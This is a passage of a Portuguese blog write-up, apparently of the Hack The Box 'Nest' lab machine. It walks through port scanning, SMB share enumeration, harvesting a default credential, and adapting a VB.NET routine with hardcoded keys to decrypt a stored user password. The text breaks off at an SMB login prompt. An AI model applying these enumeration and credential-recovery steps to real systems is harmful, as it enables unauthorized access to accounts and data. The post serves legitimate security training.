---
layout: post
title: Hackthebox - Write up of Nest machine
lang: en
description: Hackthebox - Write up of Nest machine
tags: linux kali pentest vb net smb nmap telnet smbclient smbget smbmap hqk
comments: true
--- 

Como vocês sabem, eu tenho estudado pentest. Recentemente eu me cadastrei no hackthebox.eu e comecei a fazer as máquinas faceis.

Este post vai mostrar passo a passo que eu fiz para conseguir a flag de usuário e de administrator.

Eu sempre começo com nmap:

{% highlight bash %}
$ nmap -T4 -Pn -p- -v 10.10.10.178
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 21:41 EDT
Initiating Parallel DNS resolution of 1 host. at 21:41
Completed Parallel DNS resolution of 1 host. at 21:41, 0.01s elapsed
Initiating Connect Scan at 21:41
Scanning 10.10.10.178 (10.10.10.178) [65535 ports]
Discovered open port 445/tcp on 10.10.10.178
Connect Scan Timing: About 3.75% done; ETC: 21:55 (0:13:16 remaining)
Connect Scan Timing: About 16.48% done; ETC: 21:47 (0:05:09 remaining)
Connect Scan Timing: About 39.14% done; ETC: 21:45 (0:02:21 remaining)
Connect Scan Timing: About 66.62% done; ETC: 21:44 (0:01:01 remaining)
Discovered open port 4386/tcp on 10.10.10.178
Completed Connect Scan at 21:44, 220.62s elapsed (65535 total ports)
Nmap scan report for 10.10.10.178 (10.10.10.178)
Host is up (0.15s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
4386/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 220.71 seconds
{% endhighlight %}

A porta 4386 parece diferente, vamos tentar fazer um telnet nela e enumera-la:

{% highlight bash %}
$ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
>debug 1

Invalid password entered
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>setdir C:\Windows\Temp

Error: Access to the path 'C:\Windows\Temp\' is denied.
>
{% endhighlight %}

<!--more-->

Agora vamos ver o que temos no samba:

{% highlight bash %}
$ smbclient -L \\\\10.10.10.178\\
directory_create_or_exist: mkdir failed on directory /run/samba/msg.lock: Permission denied
Unable to initialize messaging context
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      
SMB1 disabled -- no workgroup available
{% endhighlight %}

Listando tudo com smbmap:

{% highlight bash %}
$ smbmap -H 10.10.10.178 -R --depth 10 -p a
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.178...
[+] IP: 10.10.10.178:445        Name: 10.10.10.178                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        .                                                  
        dr--r--r--                0 Wed Aug  7 18:53:46 2019    .
        dr--r--r--                0 Wed Aug  7 18:53:46 2019    ..
        dr--r--r--                0 Wed Aug  7 18:58:07 2019    IT
        dr--r--r--                0 Mon Aug  5 17:53:41 2019    Production
        dr--r--r--                0 Mon Aug  5 17:53:50 2019    Reports
        dr--r--r--                0 Wed Aug  7 15:07:51 2019    Shared
        Data                                                    READ ONLY
        .\
        dr--r--r--                0 Wed Aug  7 18:53:46 2019    .
        dr--r--r--                0 Wed Aug  7 18:53:46 2019    ..
        dr--r--r--                0 Wed Aug  7 18:58:07 2019    IT
        dr--r--r--                0 Mon Aug  5 17:53:41 2019    Production
        dr--r--r--                0 Mon Aug  5 17:53:50 2019    Reports
        dr--r--r--                0 Wed Aug  7 15:07:51 2019    Shared
        .\Shared\
        dr--r--r--                0 Wed Aug  7 15:07:51 2019    .
        dr--r--r--                0 Wed Aug  7 15:07:51 2019    ..
        dr--r--r--                0 Wed Aug  7 15:07:33 2019    Maintenance
        dr--r--r--                0 Wed Aug  7 15:08:07 2019    Templates
        .\Shared\Maintenance\
        dr--r--r--                0 Wed Aug  7 15:07:33 2019    .
        dr--r--r--                0 Wed Aug  7 15:07:33 2019    ..
        -r--r--r--               48 Wed Aug  7 15:07:32 2019    Maintenance Alerts.txt
        .\Shared\Templates\
        dr--r--r--                0 Wed Aug  7 15:08:07 2019    .
        dr--r--r--                0 Wed Aug  7 15:08:07 2019    ..
        dr--r--r--                0 Wed Aug  7 15:08:10 2019    HR
        dr--r--r--                0 Wed Aug  7 15:08:07 2019    Marketing
        .\Shared\Templates\HR\
        dr--r--r--                0 Wed Aug  7 15:08:10 2019    .
        dr--r--r--                0 Wed Aug  7 15:08:10 2019    ..
        -r--r--r--              425 Wed Aug  7 18:55:36 2019    Welcome Email.txt
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 NO ACCESS
        .                                                  
        dr--r--r--                0 Sat Jan 25 18:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 18:04:21 2020    ..
        dr--r--r--                0 Fri Aug  9 11:08:23 2019    Administrator
        dr--r--r--                0 Sun Jan 26 02:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 13:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 13:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 18:56:02 2019    TempUser
        Users                                                   READ ONLY
        .\
        dr--r--r--                0 Sat Jan 25 18:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 18:04:21 2020    ..
        dr--r--r--                0 Fri Aug  9 11:08:23 2019    Administrator
        dr--r--r--                0 Sun Jan 26 02:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 13:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 13:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 18:56:02 2019    TempUser
{% endhighlight %}

Baixar os arquivos que encontramos:

{% highlight bash %}
$ smbget -R smb://10.10.10.178/Data/Shared 
Password for [kali] connecting to //Data/10.10.10.178: 
Using workgroup WORKGROUP, user kali
smb://10.10.10.178/Data/Shared/Maintenance/Maintenance Alerts.txt                                                   
smb://10.10.10.178/Data/Shared/Templates/HR/Welcome Email.txt                             
Downloaded 473b in 11 seconds
{% endhighlight %}

Perfeito temos algo, vamos verificar o que temos dentro destes arquivos:

{% highlight bash %}
$ cat Templates/HR/Welcome\ Email.txt 
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
kali@kali:~/sharedcat Maintenance/Maintenance\ Alerts.txt 
There is currently no scheduled maintenance work
{% endhighlight %}


Tentando listar tudo com essa nova credencial:

{% highlight bash %}
$ smbmap -H 10.10.10.178 -R --depth 10 -u TempUser -p welcome2019
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.178...
[+] IP: 10.10.10.178:445        Name: 10.10.10.178                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        .                                                  
        dr--r--r--                0 Wed Aug  7 18:53:46 2019    .
        dr--r--r--                0 Wed Aug  7 18:53:46 2019    ..
        dr--r--r--                0 Wed Aug  7 18:58:07 2019    IT
        dr--r--r--                0 Mon Aug  5 17:53:41 2019    Production
        dr--r--r--                0 Mon Aug  5 17:53:50 2019    Reports
        dr--r--r--                0 Wed Aug  7 15:07:51 2019    Shared
        Data                                                    READ ONLY
        .\
        dr--r--r--                0 Wed Aug  7 18:53:46 2019    .
        dr--r--r--                0 Wed Aug  7 18:53:46 2019    ..
        dr--r--r--                0 Wed Aug  7 18:58:07 2019    IT
        dr--r--r--                0 Mon Aug  5 17:53:41 2019    Production
        dr--r--r--                0 Mon Aug  5 17:53:50 2019    Reports
        dr--r--r--                0 Wed Aug  7 15:07:51 2019    Shared
        .\IT\
        dr--r--r--                0 Wed Aug  7 18:58:07 2019    .
        dr--r--r--                0 Wed Aug  7 18:58:07 2019    ..
        dr--r--r--                0 Wed Aug  7 18:58:07 2019    Archive
        dr--r--r--                0 Wed Aug  7 18:59:34 2019    Configs
        dr--r--r--                0 Wed Aug  7 18:08:30 2019    Installs
        dr--r--r--                0 Sat Jan 25 19:09:13 2020    Reports
        dr--r--r--                0 Mon Aug  5 18:33:51 2019    Tools
        .\IT\Configs\
        dr--r--r--                0 Wed Aug  7 18:59:34 2019    .
        dr--r--r--                0 Wed Aug  7 18:59:34 2019    ..
        dr--r--r--                0 Wed Aug  7 15:20:13 2019    Adobe
        dr--r--r--                0 Tue Aug  6 07:16:34 2019    Atlas
        dr--r--r--                0 Tue Aug  6 09:27:08 2019    DLink
        dr--r--r--                0 Wed Aug  7 15:23:26 2019    Microsoft
        dr--r--r--                0 Wed Aug  7 15:33:54 2019    NotepadPlusPlus
        dr--r--r--                0 Wed Aug  7 16:01:13 2019    RU Scanner
        dr--r--r--                0 Tue Aug  6 09:27:09 2019    Server Manager
        .\IT\Configs\Adobe\
        dr--r--r--                0 Wed Aug  7 15:20:13 2019    .
        dr--r--r--                0 Wed Aug  7 15:20:13 2019    ..
        -r--r--r--              246 Wed Aug  7 15:20:13 2019    editing.xml
        -r--r--r--                0 Wed Aug  7 15:20:09 2019    Options.txt
        -r--r--r--              258 Wed Aug  7 15:20:09 2019    projects.xml
        -r--r--r--             1274 Wed Aug  7 15:20:09 2019    settings.xml
        .\IT\Configs\Atlas\
        dr--r--r--                0 Tue Aug  6 07:16:34 2019    .
        dr--r--r--                0 Tue Aug  6 07:16:34 2019    ..
        -r--r--r--             1369 Tue Aug  6 07:18:38 2019    Temp.XML
        .\IT\Configs\Microsoft\
        dr--r--r--                0 Wed Aug  7 15:23:26 2019    .
        dr--r--r--                0 Wed Aug  7 15:23:26 2019    ..
        -r--r--r--             4598 Wed Aug  7 15:23:26 2019    Options.xml
        .\IT\Configs\NotepadPlusPlus\
        dr--r--r--                0 Wed Aug  7 15:33:54 2019    .
        dr--r--r--                0 Wed Aug  7 15:33:54 2019    ..
        -r--r--r--             6451 Wed Aug  7 19:01:25 2019    config.xml
        -r--r--r--             2108 Wed Aug  7 19:00:36 2019    shortcuts.xml
        .\IT\Configs\RU Scanner\
        dr--r--r--                0 Wed Aug  7 16:01:13 2019    .
        dr--r--r--                0 Wed Aug  7 16:01:13 2019    ..
        -r--r--r--              270 Thu Aug  8 15:49:37 2019    RU_config.xml
        .\Shared\
        dr--r--r--                0 Wed Aug  7 15:07:51 2019    .
        dr--r--r--                0 Wed Aug  7 15:07:51 2019    ..
        dr--r--r--                0 Wed Aug  7 15:07:33 2019    Maintenance
        dr--r--r--                0 Wed Aug  7 15:08:07 2019    Templates
        .\Shared\Maintenance\
        dr--r--r--                0 Wed Aug  7 15:07:33 2019    .
        dr--r--r--                0 Wed Aug  7 15:07:33 2019    ..
        -r--r--r--               48 Wed Aug  7 15:07:32 2019    Maintenance Alerts.txt
        .\Shared\Templates\
        dr--r--r--                0 Wed Aug  7 15:08:07 2019    .
        dr--r--r--                0 Wed Aug  7 15:08:07 2019    ..
        dr--r--r--                0 Wed Aug  7 15:08:10 2019    HR
        dr--r--r--                0 Wed Aug  7 15:08:07 2019    Marketing
        .\Shared\Templates\HR\
        dr--r--r--                0 Wed Aug  7 15:08:10 2019    .
        dr--r--r--                0 Wed Aug  7 15:08:10 2019    ..
        -r--r--r--              425 Wed Aug  7 18:55:36 2019    Welcome Email.txt
        IPC$                                                    NO ACCESS       Remote IPC
        .                                                  
        dr--r--r--                0 Wed Aug  7 19:08:12 2019    .
        dr--r--r--                0 Wed Aug  7 19:08:12 2019    ..
        dr--r--r--                0 Wed Aug  7 15:40:25 2019    Finance
        dr--r--r--                0 Wed Aug  7 19:08:12 2019    HR
        dr--r--r--                0 Thu Aug  8 06:59:25 2019    IT
        Secure$                                                 READ ONLY
        .\
        dr--r--r--                0 Wed Aug  7 19:08:12 2019    .
        dr--r--r--                0 Wed Aug  7 19:08:12 2019    ..
        dr--r--r--                0 Wed Aug  7 15:40:25 2019    Finance
        dr--r--r--                0 Wed Aug  7 19:08:12 2019    HR
        dr--r--r--                0 Thu Aug  8 06:59:25 2019    IT
        .                                                  
        dr--r--r--                0 Sat Jan 25 18:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 18:04:21 2020    ..
        dr--r--r--                0 Fri Aug  9 11:08:23 2019    Administrator
        dr--r--r--                0 Sun Jan 26 02:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 13:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 13:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 18:56:02 2019    TempUser
        Users                                                   READ ONLY
        .\
        dr--r--r--                0 Sat Jan 25 18:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 18:04:21 2020    ..
        dr--r--r--                0 Fri Aug  9 11:08:23 2019    Administrator
        dr--r--r--                0 Sun Jan 26 02:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 13:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 13:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 18:56:02 2019    TempUser
        .\TempUser\
        dr--r--r--                0 Wed Aug  7 18:56:02 2019    .
        dr--r--r--                0 Wed Aug  7 18:56:02 2019    ..
        -r--r--r--                0 Wed Aug  7 18:56:02 2019    New Text Document.txt
{% endhighlight %}

Baixando tudo novamente:

{% highlight bash %}
$ smbget -R smb://10.10.10.178/Data/IT/ -U TempUser
Password for [TempUser] connecting to //Data/10.10.10.178: 
Using workgroup WORKGROUP, user TempUser
smb://10.10.10.178/Data/IT//Configs/Adobe/editing.xml                                                 
smb://10.10.10.178/Data/IT//Configs/Adobe/Options.txt                                                
smb://10.10.10.178/Data/IT//Configs/Adobe/projects.xml                                               
smb://10.10.10.178/Data/IT//Configs/Adobe/settings.xml                                                   
smb://10.10.10.178/Data/IT//Configs/Atlas/Temp.XML                                                
smb://10.10.10.178/Data/IT//Configs/Microsoft/Options.xml                                    
smb://10.10.10.178/Data/IT//Configs/NotepadPlusPlus/config.xml                            
smb://10.10.10.178/Data/IT//Configs/NotepadPlusPlus/shortcuts.xml                            
smb://10.10.10.178/Data/IT//Configs/RU Scanner/RU_config.xml   
{% endhighlight %}

Se nós verificarmos os arquivos nós conseguimos ver uma senha no RU_config.xml

{% highlight bash %}
$ cat Configs/RU\ Scanner/RU_config.xml 
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
{% endhighlight %}

Olhando os outros arquivos conseguimos ver umas outras coisas interessantes:

{% highlight bash %}
$ tail Configs/NotepadPlusPlus/config.xml 
        <Find name="redeem on" />
        <Find name="192" />
        <Replace name="C_addEvent" />
    </FindHistory>
    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
    </History>
</NotepadPlus>
{% endhighlight %}

Verificando Temp.xml

{% highlight bash %}
$ cat Configs/Atlas/Temp.XML 
<?xml version="1.0" encoding="UTF-8"?>
<bs:Brainstorm xmlns:bs="http://schemas.microsoft.com/visio/2003/brainstorming"><bs:topic bs:TopicID="T1"><bs:text>Marketing Plan</bs:text><bs:topic bs:TopicID="T1.1"><bs:text>Product</bs:text><bs:prop><bs:id>1</bs:id><bs:label>Assigned to</bs:label><bs:value>Deanna Meyer</bs:value></bs:prop><bs:topic bs:TopicID="T1.1.1"><bs:text>New features</bs:text></bs:topic><bs:topic bs:TopicID="T1.1.2"><bs:text>Competitive strengths</bs:text></bs:topic><bs:topic bs:TopicID="T1.1.3"><bs:text>Competitive weaknesses</bs:text></bs:topic></bs:topic><bs:topic bs:TopicID="T1.2"><bs:text>Placement</bs:text><bs:prop><bs:id>1</bs:id><bs:label>Assigned to</bs:label><bs:value>Jolie Lenehan</bs:value></bs:prop></bs:topic><bs:topic bs:TopicID="T1.3"><bs:text>Price</bs:text><bs:prop><bs:id>1</bs:id><bs:label>Assigned to</bs:label><bs:value>Robert O'Hara</bs:value></bs:prop></bs:topic><bs:topic bs:TopicID="T1.4"><bs:text>Promotion</bs:text><bs:prop><bs:id>1</bs:id><bs:label>Assigned to</bs:label><bs:value>Robert O'Hara</bs:value></bs:prop><bs:topic bs:TopicID="T1.4.1"><bs:text>Advertising</bs:text></bs:topic><bs:topic bs:TopicID="T1.4.2"><bs:text>Mailings</bs:text></bs:topic><bs:topic bs:TopicID="T1.4.3"><bs:text>Trade shows</bs:text></bs:topic></bs:topic></bs:topic><bs:association bs:topic1="T1.4" bs:topic2="T1.3"/></bs:Brainstorm>
{% endhighlight %}

Temos alguns possiveis nomes para usuário. Como nós já sabemos pelos arquivos recentes, podemos tentar acessa-lo diretamente:

{% highlight bash %}
$ smbmap -H 10.10.10.178 -R Secure$/IT/Carl --depth 10 -p welcome2019 -u TempUser
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.178...
[+] IP: 10.10.10.178:445        Name: 10.10.10.178                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        .                                                  
        dr--r--r--                0 Wed Aug  7 19:08:12 2019    .
        dr--r--r--                0 Wed Aug  7 19:08:12 2019    ..
        dr--r--r--                0 Wed Aug  7 15:40:25 2019    Finance
        dr--r--r--                0 Wed Aug  7 19:08:12 2019    HR
        dr--r--r--                0 Thu Aug  8 06:59:25 2019    IT
        Secure$                                                 READ ONLY
        .IT\Carl\
        dr--r--r--                0 Wed Aug  7 15:42:14 2019    .
        dr--r--r--                0 Wed Aug  7 15:42:14 2019    ..
        dr--r--r--                0 Wed Aug  7 15:44:00 2019    Docs
        dr--r--r--                0 Tue Aug  6 09:45:47 2019    Reports
        dr--r--r--                0 Tue Aug  6 10:41:55 2019    VB Projects
        .IT\Carl\Docs\
        dr--r--r--                0 Wed Aug  7 15:44:00 2019    .
        dr--r--r--                0 Wed Aug  7 15:44:00 2019    ..
        -r--r--r--               56 Wed Aug  7 15:44:16 2019    ip.txt
        -r--r--r--               73 Wed Aug  7 15:43:46 2019    mmc.txt
        .IT\Carl\VB Projects\
        dr--r--r--                0 Tue Aug  6 10:41:55 2019    .
        dr--r--r--                0 Tue Aug  6 10:41:55 2019    ..
        dr--r--r--                0 Tue Aug  6 10:41:53 2019    Production
        dr--r--r--                0 Tue Aug  6 10:47:41 2019    WIP
        .IT\Carl\VB Projects\WIP\
        dr--r--r--                0 Tue Aug  6 10:47:41 2019    .
        dr--r--r--                0 Tue Aug  6 10:47:41 2019    ..
        dr--r--r--                0 Fri Aug  9 11:36:45 2019    RU
        .IT\Carl\VB Projects\WIP\RU\
        dr--r--r--                0 Fri Aug  9 11:36:45 2019    .
        dr--r--r--                0 Fri Aug  9 11:36:45 2019    ..
        dr--r--r--                0 Wed Aug  7 18:05:54 2019    RUScanner
        -r--r--r--              871 Fri Aug  9 11:36:35 2019    RUScanner.sln
        .IT\Carl\VB Projects\WIP\RU\RUScanner\
        dr--r--r--                0 Wed Aug  7 18:05:54 2019    .
        dr--r--r--                0 Wed Aug  7 18:05:54 2019    ..
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    bin
        -r--r--r--              772 Wed Aug  7 18:05:09 2019    ConfigFile.vb
        -r--r--r--              279 Wed Aug  7 18:05:44 2019    Module1.vb
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    My Project
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    obj
        -r--r--r--             4828 Fri Aug  9 11:38:30 2019    RU Scanner.vbproj
        -r--r--r--              143 Wed Aug  7 16:00:28 2019    RU Scanner.vbproj.user
        -r--r--r--              133 Wed Aug  7 18:05:58 2019    SsoIntegration.vb
        -r--r--r--             4888 Wed Aug  7 18:06:03 2019    Utils.vb
        .IT\Carl\VB Projects\WIP\RU\RUScanner\bin\
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    .
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    ..
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    Debug
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    Release
        .IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    .
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    ..
        -r--r--r--              441 Wed Aug  7 16:00:11 2019    Application.Designer.vb
        -r--r--r--              481 Wed Aug  7 16:00:11 2019    Application.myapp
        -r--r--r--             1163 Wed Aug  7 16:00:11 2019    AssemblyInfo.vb
        -r--r--r--             2776 Wed Aug  7 16:00:11 2019    Resources.Designer.vb
        -r--r--r--             5612 Wed Aug  7 16:00:11 2019    Resources.resx
        -r--r--r--             2989 Wed Aug  7 16:00:11 2019    Settings.Designer.vb
        -r--r--r--              279 Wed Aug  7 16:00:11 2019    Settings.settings
        .IT\Carl\VB Projects\WIP\RU\RUScanner\obj\
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    .
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    ..
        dr--r--r--                0 Wed Aug  7 16:00:11 2019    x86
{% endhighlight %}

Vários novos arquivos, baixando os mesmos:

{% highlight bash %}
$ smbget -R smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser
Password for [TempUser] connecting to //Secure$/10.10.10.178: 
Using workgroup WORKGROUP, user TempUser
smb://10.10.10.178/Secure$/IT/Carl//Docs/ip.txt                                                                                                            
smb://10.10.10.178/Secure$/IT/Carl//Docs/mmc.txt                                                                                                           
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/ConfigFile.vb                                                                             
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/Module1.vb                                                                                
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb                                                        
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Application.myapp                                                              
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb                                                                
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb                                                          
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Resources.resx                                                                 
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb                                                           
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Settings.settings                                                              
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj                                                                         
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user                                                                    
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/SsoIntegration.vb                                                                         
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/Utils.vb                                                                                  
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner.sln                                                                                       
Downloaded 25.18kB in 39 seconds
{% endhighlight %}

Verificando o conteúdo deles:

{% highlight vb %}
$ cat VB\ Projects/WIP/RU/RUScanner/Module1.vb 
Module Module1

    Sub Main()
        Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}

    End Sub

End Module
{% endhighlight %}

Isso parece apontar que o mesmo utiliza RU_Config.xml que encontramos anteriormente. Olhando mais atentamente no Utils.vb:

{% highlight vb %}
    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function
{% endhighlight %}

Isso parece relacionado com a senha que encontramos, se modificarmos o arquivo um pouco:

{% highlight vb %}
Imports System
Imports System.Text
Imports System.Security.Cryptography

Public Module Module1
    Public Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function

        Public Sub Main()
                Dim plain As String
                plain = DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")
                Console.WriteLine(plain)
        End Sub
End Module
{% endhighlight %}

Lembre-se que o DecryptString recebe o parametro do RU_config.xml

Rodando este script no dotnetfiddle.net nós obtemos: "xRxRxPANCAK3SxRxRx" portanto o user c.smith tem essa senha. Tentando listar os arquivos novamente com esse usuário e senha:

{% highlight bash %}
$ smbmap -H 10.10.10.178 -R --depth 10 -p xRxRxPANCAK3SxRxRx -u C.Smith
{% endhighlight %}

Nós conseguimos ver vários arquivos diferentes e conseguir a flag de usuário. Baixando tudo novamente.

{% highlight bash %}
$ smbget -R smb://10.10.10.178/Users/C.Smith -U c.smith
Password for [c.smith] connecting to //Users/10.10.10.178: 
Using workgroup WORKGROUP, user c.smith
smb://10.10.10.178/Users/C.Smith/HQK Reporting/AD Integration Module/HqkLdap.exe                                                          
smb://10.10.10.178/Users/C.Smith/HQK Reporting/Debug Mode Password.txt                               
smb://10.10.10.178/Users/C.Smith/HQK Reporting/HQK_Config_Backup.xml                              
smb://10.10.10.178/Users/C.Smith/user.txt                                
Downloaded 17.27kB in 12 seconds
{% endhighlight %}

Debug mode password.txt está vazio, o que parece estranho mas tentando conseguir mais informações sobre o mesmo:

{% highlight bash %}
$ smbclient -H \\\\10.10.10.178\\Users/ -U c.smith
directory_create_or_exist: mkdir failed on directory /run/samba/msg.lock: Permission denied
Unable to initialize messaging context
Enter WORKGROUP\c.smith's password: 
